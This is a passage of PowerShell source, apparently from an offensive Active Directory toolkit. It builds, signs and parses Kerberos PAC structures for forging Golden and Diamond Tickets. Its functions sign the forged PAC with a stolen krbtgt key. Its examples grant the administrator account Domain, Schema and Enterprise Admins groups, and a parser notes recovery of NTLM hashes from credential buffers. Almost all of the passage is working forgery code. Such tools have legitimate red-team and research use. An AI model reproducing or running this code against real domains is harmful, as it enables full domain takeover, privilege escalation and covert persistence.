    $result += Write-UInt16LE -Value $dnsBytes.Length        # DNS Length
    $result += Write-UInt16LE -Value $dnsOffset              # DNS Offset
    $result += Write-UInt32LE -Value $flags                  # Flags (UPN_CONSTRUCTED)
    $result += [byte[]]@(0x00, 0x00, 0x00, 0x00)             # Padding (like Rubeus)
    $result += [byte[]]$upnBytes
    $result += [byte[]]$dnsBytes

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_REQUESTOR Builder (MS-PAC 2.12)
# ============================================================================

function Build-PACRequestor {
    <#
    .SYNOPSIS
        Builds a PAC_REQUESTOR structure from scratch.
    .DESCRIPTION
        PAC_REQUESTOR is simply a raw SID identifying the requestor.
        For a TGT, this is the user's full SID (DomainSID + UserRID).
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidatePattern('^S-1-5-21-\d+-\d+-\d+$')]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID
    )

    # Build SID bytes: DomainSID-UserRID
    $sidParts = $DomainSID -split '-'

    # Validate SID has expected structure (S-1-5-21-x-x-x = 7 parts minimum)
    if ($sidParts.Length -lt 4) {
        throw "Invalid DomainSID format: $DomainSID - expected S-1-5-21-x-x-x format"
    }
    $sidRevision = [byte]1
    $sidSubAuthCount = [byte]($sidParts.Length - 3 + 1)  # domain sub-authorities + user RID
    $sidAuthority = [byte[]]::new(6)
    $authValue = [uint64]$sidParts[2]
    $sidAuthority[0] = [byte](($authValue -shr 40) -band 0xFF)
    $sidAuthority[1] = [byte](($authValue -shr 32) -band 0xFF)
    $sidAuthority[2] = [byte](($authValue -shr 24) -band 0xFF)
    $sidAuthority[3] = [byte](($authValue -shr 16) -band 0xFF)
    $sidAuthority[4] = [byte](($authValue -shr 8) -band 0xFF)
    $sidAuthority[5] = [byte]($authValue -band 0xFF)

    $result = @()
    $result += $sidRevision
    $result += $sidSubAuthCount
    $result += [byte[]]$sidAuthority
    # Domain sub-authorities
    for ($i = 3; $i -lt $sidParts.Length; $i++) {
        $result += [BitConverter]::GetBytes([uint32]$sidParts[$i])
    }
    # User RID
    $result += [BitConverter]::GetBytes([uint32]$UserRID)

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# PAC_ATTRIBUTES_INFO Builder (MS-PAC 2.11)
# ============================================================================

function Build-PACAttributesInfo {
    <#
    .SYNOPSIS
        Builds a PAC_ATTRIBUTES_INFO structure.
    .DESCRIPTION
        PAC_ATTRIBUTES_INFO (MS-PAC 2.11) contains:
        - FlagsLength (ULONG): Length of valid flag bits (value=2 means bits 0-1 are valid)
        - Flags (ULONG): Flag bits
        Flags:
        - Bit 0 (0x00000001) = PAC_WAS_REQUESTED (client requested PAC via PA-PAC-OPTIONS)
        - Bit 1 (0x00000002) = PAC_WAS_GIVEN_IMPLICITLY (client did not request/decline PAC)
    #>
    [CmdletBinding()]
    param(
        [uint32]$FlagsLength = 2,   # 2 valid flag bits defined in spec
        [uint32]$Flags = 1          # PAC_WAS_REQUESTED
    )

    $result = @()
    $result += Write-UInt32LE -Value $FlagsLength    # FlagsLength (number of valid flag bits)
    $result += Write-UInt32LE -Value $Flags           # Flags (PAC_WAS_REQUESTED = 1)

    return ConvertTo-FlatByteArray $result
}

# ============================================================================
# Complete PAC Builder
# ============================================================================

function Build-PAC {
    <#
    .SYNOPSIS
        Builds a complete PAC (Privilege Attribute Certificate) structure.

    .DESCRIPTION
        Creates a full PAC suitable for embedding in a Kerberos ticket.
        The PAC contains:
        - KERB_VALIDATION_INFO: User info and group memberships
        - PAC_CLIENT_INFO: Client name and timestamp
        - PAC_SERVER_CHECKSUM: Server signature (zeroed, needs computation)
        - PAC_PRIVSVR_CHECKSUM: KDC signature (zeroed, needs computation)

    .PARAMETER UserName
        The sAMAccountName of the user.

    .PARAMETER Domain
        The NetBIOS domain name (e.g., "CONTOSO").

    .PARAMETER DnsDomainName
        The DNS domain name (e.g., "contoso.com"). Used for UPN_DNS_INFO buffer.
        If not specified, derived from Domain parameter.

    .PARAMETER DomainSID
        The domain SID string (e.g., "S-1-5-21-xxx-xxx-xxx").

    .PARAMETER UserRID
        The user's relative identifier (RID).

    .PARAMETER GroupRIDs
        Array of group RIDs the user belongs to.
        For Golden Ticket, typically includes: 512 (Domain Admins), 513 (Domain Users),
        518 (Schema Admins), 519 (Enterprise Admins), 520 (Group Policy Creator Owners).

    .PARAMETER ExtraSIDs
        Array of extra SIDs for cross-domain/universal group membership.
        Can include SIDs like S-1-18-1 (Authentication Authority Asserted Identity).

    .PARAMETER EncryptionType
        The encryption type for signature algorithm:
        - 23: RC4-HMAC (uses HMAC-MD5)
        - 17: AES128-CTS (uses HMAC-SHA1-96)
        - 18: AES256-CTS (uses HMAC-SHA1-96)

    .PARAMETER LogonTime
        The logon time (default: current time).

    .PARAMETER AuthTime
        The authentication time. MUST match EncTicketPart.authtime exactly.
        Truncated to second-level precision internally (Kerberos GeneralizedTime limitation).

    .EXAMPLE
        $authTime = [datetime]::UtcNow
        $pac = Build-PAC -UserName "administrator" -Domain "CONTOSO" `
            -DnsDomainName "contoso.com" -DomainSID "S-1-5-21-xxx-xxx-xxx" `
            -UserRID 500 -GroupRIDs @(512, 513, 518, 519, 520) `
            -EncryptionType 23 -AuthTime $authTime

    .OUTPUTS
        PSCustomObject with properties:
        - PACData: Complete PAC bytes
        - ServerChecksumOffset: Offset to server signature
        - KDCChecksumOffset: Offset to KDC signature

    .NOTES
        After building the PAC, the signatures must be computed:
        1. Server checksum: HMAC over PAC with server signature zeroed
        2. KDC checksum: HMAC over server checksum
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$DnsDomainName,

        [Parameter(Mandatory=$true)]
        [string]$DomainSID,

        [Parameter(Mandatory=$true)]
        [uint32]$UserRID,

        [Parameter(Mandatory=$false)]
        [uint32[]]$GroupRIDs = @($Script:DOMAIN_GROUP_RID_USERS),

        [Parameter(Mandatory=$false)]
        [string[]]$ExtraSIDs = @(),

        [Parameter(Mandatory=$false)]
        [ValidateSet(17, 18, 23)]
        [int]$EncryptionType = 23,

        [Parameter(Mandatory=$false)]
        [datetime]$LogonTime,

        [Parameter(Mandatory=$true)]
        [datetime]$AuthTime
    )

    if (-not $LogonTime) { $LogonTime = [datetime]::UtcNow }

    # CRITICAL: AuthTime must be truncated to second-level precision!
    # Kerberos GeneralizedTime (used in EncTicketPart.authtime) has only second precision,
    # but FILETIME (used in CLIENT_INFO.ClientId) has 100-nanosecond precision.
    # If we don't truncate, CLIENT_INFO.ClientId won't match the KDC's comparison value.
    $AuthTime = [datetime]::new($AuthTime.Year, $AuthTime.Month, $AuthTime.Day,
        $AuthTime.Hour, $AuthTime.Minute, $AuthTime.Second, [System.DateTimeKind]::Utc)

    # Derive DNS domain name if not provided
    if (-not $DnsDomainName) {
        if ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
            $DnsDomainName = $Script:LDAPContext.Domain
        }
        else {
            $DnsDomainName = $Domain.ToLowerInvariant()
        }
    }

    # Determine signature type based on encryption
    $sigType = switch ($EncryptionType) {
        23 { $Script:KERB_CHECKSUM_HMAC_MD5 }
        17 { $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES128 }
        18 { $Script:KERB_CHECKSUM_HMAC_SHA1_96_AES256 }
    }

    # Build individual PAC buffers
    # Force conversion to byte[] - PowerShell array concatenation creates Object[]
    $validationInfo = [byte[]](Build-KerbValidationInfo -UserName $UserName -Domain $Domain `
        -DomainSID $DomainSID -UserRID $UserRID -GroupRIDs $GroupRIDs `
        -ExtraSIDs $ExtraSIDs -LogonTime $LogonTime)

    # CLIENT_INFO.ClientId MUST match EncTicketPart.authtime for DC validation!
    $clientInfo = [byte[]](Build-PACClientInfo -ClientName $UserName -ClientId $AuthTime)

    $upnDnsInfo = [byte[]](Build-PACUpnDnsInfo -UserName $UserName `
        -DnsDomainName $DnsDomainName -DomainSID $DomainSID -UserRID $UserRID)

    $attributesInfo = [byte[]](Build-PACAttributesInfo)  # FlagsLength=2, Flags=1 (PAC_WAS_REQUESTED)

    $requestorInfo = [byte[]](Build-PACRequestor -DomainSID $DomainSID -UserRID $UserRID)

    $serverSig = [byte[]](Build-PACSignature -SignatureType $sigType)
    $kdcSig = [byte[]](Build-PACSignature -SignatureType $sigType)

    # 7 buffers matching Rubeus/Impacket order:
    # LOGON_INFO, CLIENT_INFO, UPN_DNS_INFO, ATTRIBUTES_INFO, REQUESTOR, SERVER_CHECKSUM, PRIVSVR_CHECKSUM
    $bufferCount = 7

    Write-Verbose "[Build-PAC] Buffer sizes: LOGON_INFO=$($validationInfo.Length), CLIENT_INFO=$($clientInfo.Length), UPN_DNS=$($upnDnsInfo.Length), ATTRIBUTES=$($attributesInfo.Length), REQUESTOR=$($requestorInfo.Length), ServerSig=$($serverSig.Length), KDCSig=$($kdcSig.Length)"

    # Calculate header size: cBuffers (4) + Version (4) + N * PAC_INFO_BUFFER (16 each)
    $headerSize = 8 + ($bufferCount * 16)

    # Align each buffer to 8-byte boundary
    function Align8 { param([int]$Size) return [math]::Ceiling($Size / 8) * 8 }

    $validationInfoPadded = Align8 $validationInfo.Length
    $clientInfoPadded = Align8 $clientInfo.Length
    $upnDnsInfoPadded = Align8 $upnDnsInfo.Length
    $attributesInfoPadded = Align8 $attributesInfo.Length
    $requestorInfoPadded = Align8 $requestorInfo.Length
    $serverSigPadded = Align8 $serverSig.Length
    $kdcSigPadded = Align8 $kdcSig.Length

    # Calculate offsets (sequential, 8-byte aligned)
    $offset1 = $headerSize                                              # LOGON_INFO
    $offset2 = $offset1 + $validationInfoPadded                        # CLIENT_INFO
    $offset3 = $offset2 + $clientInfoPadded                            # UPN_DNS_INFO
    $offset4 = $offset3 + $upnDnsInfoPadded                            # ATTRIBUTES_INFO
    $offset5 = $offset4 + $attributesInfoPadded                        # REQUESTOR
    $offset6 = $offset5 + $requestorInfoPadded                         # SERVER_CHECKSUM
    $offset7 = $offset6 + $serverSigPadded                             # PRIVSVR_CHECKSUM

    # Build PAC header (PACTYPE structure)
    $pacHeader = [System.Collections.Generic.List[byte]]::new()
    $pacHeader.AddRange([byte[]](Write-UInt32LE -Value $bufferCount))    # cBuffers
    $pacHeader.AddRange([byte[]](Write-UInt32LE -Value 0))               # Version

    # PAC_INFO_BUFFER entries (same order as Rubeus/Impacket)
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_LOGON_INFO -Size $validationInfo.Length -Offset $offset1))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_CLIENT_INFO_TYPE -Size $clientInfo.Length -Offset $offset2))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_UPN_DNS_INFO -Size $upnDnsInfo.Length -Offset $offset3))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_ATTRIBUTES_INFO -Size $attributesInfo.Length -Offset $offset4))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_REQUESTOR -Size $requestorInfo.Length -Offset $offset5))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_SERVER_CHECKSUM -Size $serverSig.Length -Offset $offset6))
    $pacHeader.AddRange([byte[]](New-PACInfoBuffer -Type $Script:PAC_PRIVSVR_CHECKSUM -Size $kdcSig.Length -Offset $offset7))

    # Build complete PAC
    $pac = [System.Collections.Generic.List[byte]]::new()
    $pac.AddRange([byte[]]$pacHeader.ToArray())

    # Add LOGON_INFO with padding
    $pac.AddRange($validationInfo)
    $padding1 = $validationInfoPadded - $validationInfo.Length
    if ($padding1 -gt 0) { $pac.AddRange([byte[]]::new($padding1)) }

    # Add CLIENT_INFO with padding
    $pac.AddRange($clientInfo)
    $padding2 = $clientInfoPadded - $clientInfo.Length
    if ($padding2 -gt 0) { $pac.AddRange([byte[]]::new($padding2)) }

    # Add UPN_DNS_INFO with padding
    $pac.AddRange($upnDnsInfo)
    $padding3 = $upnDnsInfoPadded - $upnDnsInfo.Length
    if ($padding3 -gt 0) { $pac.AddRange([byte[]]::new($padding3)) }

    # Add ATTRIBUTES_INFO with padding
    $pac.AddRange($attributesInfo)
    $padding4 = $attributesInfoPadded - $attributesInfo.Length
    if ($padding4 -gt 0) { $pac.AddRange([byte[]]::new($padding4)) }

    # Add REQUESTOR with padding
    $pac.AddRange($requestorInfo)
    $padding5 = $requestorInfoPadded - $requestorInfo.Length
    if ($padding5 -gt 0) { $pac.AddRange([byte[]]::new($padding5)) }

    # Add SERVER_CHECKSUM with padding
    $serverChecksumOffset = $pac.Count + 4  # Points to signature bytes (after 4-byte SignatureType)
    $pac.AddRange($serverSig)
    $padding6 = $serverSigPadded - $serverSig.Length
    if ($padding6 -gt 0) { $pac.AddRange([byte[]]::new($padding6)) }

    # Add PRIVSVR_CHECKSUM with padding
    $kdcChecksumOffset = $pac.Count + 4  # Points to signature bytes (after 4-byte SignatureType)
    $pac.AddRange($kdcSig)
    $padding7 = $kdcSigPadded - $kdcSig.Length
    if ($padding7 -gt 0) { $pac.AddRange([byte[]]::new($padding7)) }

    $totalSize = $pac.Count
    Write-Verbose "[Build-PAC] Total PAC: $totalSize bytes, bufferCount=$bufferCount, headerSize=$headerSize"
    Write-Verbose "[Build-PAC] Offsets: LOGON=$offset1, CLIENT=$offset2, UPN_DNS=$offset3, ATTRIB=$offset4, REQUESTOR=$offset5, ServerSig=$offset6, KDCSig=$offset7"
    Write-Verbose "[Build-PAC] ServerChecksumOffset=$serverChecksumOffset, KDCChecksumOffset=$kdcChecksumOffset"
    Write-Verbose "[Build-PAC] PAC header first 8 bytes: $(($pac.ToArray()[0..7] | ForEach-Object { '0x{0:X2}' -f $_ }) -join ' ')"

    return [PSCustomObject]@{
        PACData = [byte[]]$pac.ToArray()
        ServerChecksumOffset = $serverChecksumOffset
        KDCChecksumOffset = $kdcChecksumOffset
        SignatureType = $sigType
    }
}

# ============================================================================
# PAC Signature Computation
# ============================================================================

function Complete-PACSignatures {
    <#
    .SYNOPSIS
        Computes and inserts PAC signatures using the krbtgt key.

    .DESCRIPTION
        Calculates the PAC checksums:
        1. Server checksum: HMAC over PAC with signatures zeroed, using KeyUsage 17
        2. KDC checksum: HMAC over server checksum bytes, using KeyUsage 17

    .PARAMETER PACData
        The PAC bytes with zeroed signatures.

    .PARAMETER ServerChecksumOffset
        Offset to server signature data.

    .PARAMETER KDCChecksumOffset
        Offset to KDC signature data.

    .PARAMETER Key
        The krbtgt key bytes (NT-Hash for RC4, AES key for AES).

    .PARAMETER EncryptionType
        The encryption type (17, 18, or 23).

    .OUTPUTS
        Byte array of PAC with computed signatures.

    .NOTES
        Key usage 17 is used for PAC checksums (MS-PAC 2.8.1).
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$PACData,

        [Parameter(Mandatory=$true)]
        [int]$ServerChecksumOffset,

        [Parameter(Mandatory=$true)]
        [int]$KDCChecksumOffset,

        [Parameter(Mandatory=$true)]
        [byte[]]$Key,

        [Parameter(Mandatory=$true)]
        [ValidateSet(17, 18, 23)]
        [int]$EncryptionType
    )

    # Make a copy of PAC data
    $pac = [byte[]]::new($PACData.Length)
    [Array]::Copy($PACData, $pac, $PACData.Length)

    # Determine signature length
    $sigLength = if ($EncryptionType -eq 23) { 16 } else { 12 }

    # Key usage for PAC checksums
    $keyUsage = 17

    # Verify signatures are zeroed before computing
    $serverSigZeroed = $true
    $kdcSigZeroed = $true
    for ($si = 0; $si -lt $sigLength; $si++) {
        if ($pac[$ServerChecksumOffset + $si] -ne 0) { $serverSigZeroed = $false; break }
    }
    for ($si = 0; $si -lt $sigLength; $si++) {
        if ($pac[$KDCChecksumOffset + $si] -ne 0) { $kdcSigZeroed = $false; break }
    }
    Write-Verbose "[Complete-PACSignatures] PAC=$($pac.Length) bytes, sigLength=$sigLength, ServerOffset=$ServerChecksumOffset, KDCOffset=$KDCChecksumOffset"
    Write-Verbose "[Complete-PACSignatures] Server sig zeroed: $serverSigZeroed, KDC sig zeroed: $kdcSigZeroed"
    Write-Verbose "[Complete-PACSignatures] Bytes at ServerOffset-4..ServerOffset+3: $(($pac[($ServerChecksumOffset-4)..($ServerChecksumOffset+3)] | ForEach-Object { '0x{0:X2}' -f $_ }) -join ' ')"
    Write-Verbose "[Complete-PACSignatures] Bytes at KDCOffset-4..KDCOffset+3: $(($pac[($KDCChecksumOffset-4)..($KDCChecksumOffset+3)] | ForEach-Object { '0x{0:X2}' -f $_ }) -join ' ')"

    # Diagnostic: Dump PAC header to verify offsets match
    $cBufs = [BitConverter]::ToUInt32($pac, 0)
    Write-Verbose "[Complete-PACSignatures] PAC has $cBufs buffers:"
    for ($bi = 0; $bi -lt $cBufs; $bi++) {
        $bufOff = 8 + ($bi * 16)
        $bType = [BitConverter]::ToUInt32($pac, $bufOff)
        $bSize = [BitConverter]::ToUInt32($pac, $bufOff + 4)
        $bOffset = [BitConverter]::ToUInt64($pac, $bufOff + 8)
        $bTypeName = switch ($bType) { 1 { "LOGON_INFO" } 6 { "SVR_CKSUM" } 7 { "KDC_CKSUM" } 10 { "CLIENT" } 12 { "UPN_DNS" } 17 { "ATTRIB" } 18 { "REQUESTOR" } default { "TYPE_$bType" } }
        Write-Verbose "[Complete-PACSignatures]   Buffer[$bi]: Type=$bType ($bTypeName), Size=$bSize, Offset=$bOffset"
    }

    # Compute server checksum (MS-PAC 2.8.1)
    # Both signature fields must be zeroed when computing server checksum
    # (Build-PAC already provides zeroed signatures)
    # Use native Windows crypto via cryptdll.dll CDLocateCheckSum (same as Rubeus)
    Write-Verbose "[Complete-PACSignatures] PAC first 16 bytes: $(($pac[0..15] | ForEach-Object { '{0:X2}' -f $_ }) -join ' ')"
    Write-Verbose "[Complete-PACSignatures] PAC at sig areas: SVR[$ServerChecksumOffset..$(${ServerChecksumOffset}+11)]=$(($pac[$ServerChecksumOffset..($ServerChecksumOffset+11)] | ForEach-Object { '{0:X2}' -f $_ }) -join ' ') KDC[$KDCChecksumOffset..$(${KDCChecksumOffset}+11)]=$(($pac[$KDCChecksumOffset..($KDCChecksumOffset+11)] | ForEach-Object { '{0:X2}' -f $_ }) -join ' ')"
    $serverChecksum = Get-KerberosChecksumNative -Key $Key -Data $pac -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Insert server checksum
    Write-Verbose "[Complete-PACSignatures] Server checksum ($($serverChecksum.Length) bytes): $(($serverChecksum[0..([Math]::Min(11,$serverChecksum.Length-1))] | ForEach-Object { '{0:X2}' -f $_ }) -join '')"
    [Array]::Copy($serverChecksum, 0, $pac, $ServerChecksumOffset, $sigLength)

    # Compute KDC checksum (MS-PAC 2.8.2)
    # KDC checksum is keyed hash of the server checksum value only
    # Use native Windows crypto via cryptdll.dll CDLocateCheckSum (same as Rubeus)
    $kdcChecksum = Get-KerberosChecksumNative -Key $Key -Data $serverChecksum -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Insert KDC checksum
    [Array]::Copy($kdcChecksum, 0, $pac, $KDCChecksumOffset, $sigLength)

    return $pac
}

# ============================================================================
# PAC Parser Functions (for Diamond Tickets)
# ============================================================================

function Read-UInt16LE {
    <#
    .SYNOPSIS
        Reads a 16-bit unsigned integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToUInt16($Data, $Offset)
}

function Read-UInt32LE {
    <#
    .SYNOPSIS
        Reads a 32-bit unsigned integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToUInt32($Data, $Offset)
}

function Read-Int32LE {
    <#
    .SYNOPSIS
        Reads a 32-bit signed integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToInt32($Data, $Offset)
}

function Read-UInt64LE {
    <#
    .SYNOPSIS
        Reads a 64-bit unsigned integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToUInt64($Data, $Offset)
}

function Read-Int64LE {
    <#
    .SYNOPSIS
        Reads a 64-bit signed integer in little-endian format from byte array.
    #>
    [CmdletBinding()]
    param(
        [byte[]]$Data,
        [int]$Offset
    )

    return [BitConverter]::ToInt64($Data, $Offset)
}

function ConvertFrom-FileTime {
    <#
    .SYNOPSIS
        Converts a Windows FILETIME to DateTime.
    #>
    [CmdletBinding()]
    param([int64]$FileTime)

    try {
        if ($FileTime -le 0 -or $FileTime -ge [datetime]::MaxValue.ToFileTimeUtc()) {
            return [datetime]::MaxValue
        }
        return [datetime]::FromFileTimeUtc($FileTime)
    }
    catch {
        return [datetime]::MaxValue
    }
}

function ConvertTo-SIDString {
    <#
    .SYNOPSIS
        Converts binary SID to string format.
    #>
    [CmdletBinding()]
    param([byte[]]$SIDBytes)

    try {
        $sid = New-Object System.Security.Principal.SecurityIdentifier($SIDBytes, 0)
        return $sid.Value
    }
    catch {
        Write-Log "[ConvertTo-SIDString] Failed to parse SID bytes - $_" -Level Error
        return $null
    }
}

function Read-PAC {
    <#
    .SYNOPSIS
        Parses a PAC (Privilege Attribute Certificate) structure.

    .DESCRIPTION
        Reads and parses a PAC from binary data, extracting:
        - KERB_VALIDATION_INFO: User info and group memberships
        - PAC_CLIENT_INFO: Client name and timestamp
        - PAC_SIGNATURE_DATA: Server and KDC checksums

    .PARAMETER PACData
        The raw PAC bytes.

    .OUTPUTS
        PSCustomObject with parsed PAC information.

    .EXAMPLE
        $pac = Read-PAC -PACData $pacBytes
        $pac.UserName
        $pac.GroupRIDs

    .NOTES
        Used by Diamond Ticket to parse and modify existing PAC.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$PACData
    )

    try {
        # PACTYPE header
        $cBuffers = Read-UInt32LE -Data $PACData -Offset 0
        $version = Read-UInt32LE -Data $PACData -Offset 4

        Write-Log "[Read-PAC] PAC has $cBuffers buffers, version $version" -Level Debug

        $buffers = @()
        $offset = 8

        # Read PAC_INFO_BUFFER entries
        for ($i = 0; $i -lt $cBuffers; $i++) {
            $bufferType = Read-UInt32LE -Data $PACData -Offset $offset
            $bufferSize = Read-UInt32LE -Data $PACData -Offset ($offset + 4)
            $bufferOffset = Read-UInt64LE -Data $PACData -Offset ($offset + 8)

            $buffers += [PSCustomObject]@{
                Type = $bufferType
                Size = $bufferSize
                Offset = $bufferOffset
            }

            $offset += 16
        }

        # Initialize result
        $result = [PSCustomObject]@{
            Version = $version
            BufferCount = $cBuffers
            Buffers = $buffers
            UserName = $null
            Domain = $null
            DomainSID = $null
            UserRID = $null
            PrimaryGroupRID = $null
            GroupRIDs = @()
            ExtraSIDs = @()
            LogonTime = $null
            UserAccountControl = $null
            ServerChecksumOffset = $null
            KDCChecksumOffset = $null
            ServerChecksum = $null
            KDCChecksum = $null
            SignatureType = $null
            RawValidationInfo = $null
            RawValidationInfoOffset = $null
            RawValidationInfoSize = $null
            CredentialInfoBuffer = $null
        }

        # Parse each buffer
        foreach ($buffer in $buffers) {
            # Bounds check: ensure buffer offset and size are within PAC data
            if ($buffer.Offset -lt 0 -or $buffer.Size -lt 0 -or
                ($buffer.Offset + $buffer.Size) -gt $PACData.Length) {
                Write-Log "[Read-PAC] Buffer type $($buffer.Type) exceeds PAC bounds: offset=$($buffer.Offset), size=$($buffer.Size), PAC length=$($PACData.Length)" -Level Warning
                continue
            }
            $bufferData = $PACData[$buffer.Offset..($buffer.Offset + $buffer.Size - 1)]

            switch ($buffer.Type) {
                $Script:PAC_LOGON_INFO {
                    Write-Log "[Read-PAC] Parsing LOGON_INFO at offset $($buffer.Offset)" -Level Debug
                    $logonInfo = Read-KerbValidationInfo -Data $bufferData
                    $result.UserName = $logonInfo.UserName
                    $result.Domain = $logonInfo.Domain
                    $result.DomainSID = $logonInfo.DomainSID
                    $result.UserRID = $logonInfo.UserRID
                    $result.PrimaryGroupRID = $logonInfo.PrimaryGroupRID
                    $result.GroupRIDs = $logonInfo.GroupRIDs
                    $result.ExtraSIDs = $logonInfo.ExtraSIDs
                    $result.LogonTime = $logonInfo.LogonTime
                    $result.UserAccountControl = $logonInfo.UserAccountControl
                    $result.RawValidationInfo = $bufferData
                    $result.RawValidationInfoOffset = $buffer.Offset
                    $result.RawValidationInfoSize = $buffer.Size
                }

                $Script:PAC_CREDENTIALS_INFO {
                    # PAC_CREDENTIAL_INFO (Type 2) - encrypted credential data
                    # Contains NTLM hash when present (e.g., from PKINIT U2U)
                    # Structure: Version(4) + EncryptionType(4) + SerializedData(rest)
                    # We store raw bytes here; decryption happens in Invoke-UnPACTheHash with the AS-REP Reply Key
                    Write-Log "[Read-PAC] Found CREDENTIAL_INFO at offset $($buffer.Offset) ($($buffer.Size) bytes)" -Level Debug
                    $result.CredentialInfoBuffer = $bufferData
                }

                $Script:PAC_CLIENT_INFO_TYPE {
                    Write-Log "[Read-PAC] Parsing CLIENT_INFO at offset $($buffer.Offset)" -Level Debug
                    $clientInfo = Read-PACClientInfo -Data $bufferData
                    if (-not $result.UserName) {
                        $result.UserName = $clientInfo.ClientName
                    }
                }

                $Script:PAC_SERVER_CHECKSUM {
                    Write-Log "[Read-PAC] Parsing SERVER_CHECKSUM at offset $($buffer.Offset)" -Level Debug
                    $sigInfo = Read-PACSignature -Data $bufferData
                    $result.ServerChecksumOffset = $buffer.Offset + 4  # +4 to skip SignatureType
                    $result.ServerChecksum = $sigInfo.Signature
                    $result.SignatureType = $sigInfo.SignatureType
                }

                $Script:PAC_PRIVSVR_CHECKSUM {
                    Write-Log "[Read-PAC] Parsing KDC_CHECKSUM at offset $($buffer.Offset)" -Level Debug
                    $sigInfo = Read-PACSignature -Data $bufferData
                    $result.KDCChecksumOffset = $buffer.Offset + 4  # +4 to skip SignatureType
                    $result.KDCChecksum = $sigInfo.Signature
                }
            }
        }

        return $result
    }
    catch {
        Write-Log "[Read-PAC] Error parsing PAC: $_" -Level Error
        return $null
    }
}

function Read-KerbValidationInfo {
    <#
    .SYNOPSIS
        Parses a KERB_VALIDATION_INFO structure from NDR-marshaled data.

    .DESCRIPTION
        Extracts user information and group memberships from the primary
        PAC buffer. Handles NDR pointer dereferencing and Unicode strings.

    .PARAMETER Data
        The raw KERB_VALIDATION_INFO bytes (without PAC header).

    .NOTES
        This is a simplified parser that extracts the most important fields.
        Full NDR parsing is complex; we focus on what's needed for Diamond Tickets.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    $result = [PSCustomObject]@{
        LogonTime = $null
        LogoffTime = $null
        UserName = $null
        Domain = $null
        DomainSID = $null
        UserRID = $null
        PrimaryGroupRID = $null
        GroupRIDs = @()
        ExtraSIDs = @()
        UserAccountControl = $null
    }

    try {
        $offset = 0

        # Skip NDR type serialization header if present (MS-RPCE 2.2.6)
        # Common header (8 bytes): Version(1)=0x01 + Endianness(1)=0x10 + CommonHeaderLength(2) + Filler(4)
        # Private header (8 bytes): ObjectBufferLength(4) + Filler(4)
        # Total: 16 bytes (both headers always present together)
        if ($Data.Length -ge 16 -and $Data[0] -eq 0x01 -and $Data[1] -eq 0x10) {
            $offset = 16
            Write-Log "[Read-KerbValidationInfo] Skipped NDR header (16 bytes)" -Level Debug
        }

        # NDR referent ID for the top-level pointer (4 bytes) - skip if present
        # This is the UniqueId for the KERB_VALIDATION_INFO pointer
        $possibleReferentId = Read-UInt32LE -Data $Data -Offset $offset
        if ($possibleReferentId -eq 0x00020000 -or ($possibleReferentId -band 0xFFFF0000) -eq 0x00020000) {
            $offset += 4
            Write-Log "[Read-KerbValidationInfo] Skipped top-level referent ID" -Level Debug
        }

        Write-Log "[Read-KerbValidationInfo] Fixed structure starts at offset $offset" -Level Debug

        # === FIXED STRUCTURE (KERB_VALIDATION_INFO) ===
        # All RPC_UNICODE_STRING fields: Length(2) + MaxLength(2) + Pointer(4) = 8 bytes
        # Track all pointer values to know which referents to expect

        # LogonTime (FILETIME - 8 bytes)
        $logonTime = Read-Int64LE -Data $Data -Offset $offset
        $result.LogonTime = ConvertFrom-FileTime -FileTime $logonTime
        $offset += 8

        # LogoffTime (8 bytes) - skip
        $offset += 8

        # KickOffTime (8 bytes) - skip
        $offset += 8

        # PasswordLastSet (8 bytes) - skip
        $offset += 8

        # PasswordCanChange (8 bytes) - skip
        $offset += 8

        # PasswordMustChange (8 bytes) - skip
        $offset += 8

        # EffectiveName (RPC_UNICODE_STRING - 8 bytes)
        $effectiveNamePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # FullName (RPC_UNICODE_STRING - 8 bytes)
        $fullNamePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonScript (RPC_UNICODE_STRING - 8 bytes)
        $logonScriptPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # ProfilePath (RPC_UNICODE_STRING - 8 bytes)
        $profilePathPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # HomeDirectory (RPC_UNICODE_STRING - 8 bytes)
        $homeDirPtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # HomeDirectoryDrive (RPC_UNICODE_STRING - 8 bytes)
        $homeDirDrivePtr = Read-UInt32LE -Data $Data -Offset ($offset + 4)
        $offset += 8

        # LogonCount (2 bytes)
        $offset += 2

        # BadPasswordCount (2 bytes)
        $offset += 2

        # UserId (4 bytes)
